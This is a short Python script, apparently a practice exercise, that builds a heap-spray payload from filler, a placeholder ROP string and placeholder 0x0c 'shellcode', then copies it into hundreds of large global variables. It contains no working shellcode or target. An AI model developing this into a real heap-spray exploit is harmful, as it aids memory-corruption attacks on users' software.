import time

final_payload = ""
offset = 0xbec
junk 	  		= "2020"
rop  	  		= "4141424243434444454546464747"
shellcode 		= "0c0c00c0c0c0c0c0c0c0c0c0c0c0"

while(len(junk) < 0x10000):
    junk += junk
final_payload = junk[0:offset]
final_payload += rop
final_payload += shellcode
final_payload += junk[0:0x10000-offset-len(rop)-len(shellcode)]
""

while(len(final_payload) < 0x80000):
    final_payload += final_payload
i = 0 
for j in range(0,0x500):
    i += 1
    globals()["w" + str(i)] = final_payload[0:(0x7fb00)]
    print(hex(id("w"+str(i))))
print("am terminat")
time.sleep(10)
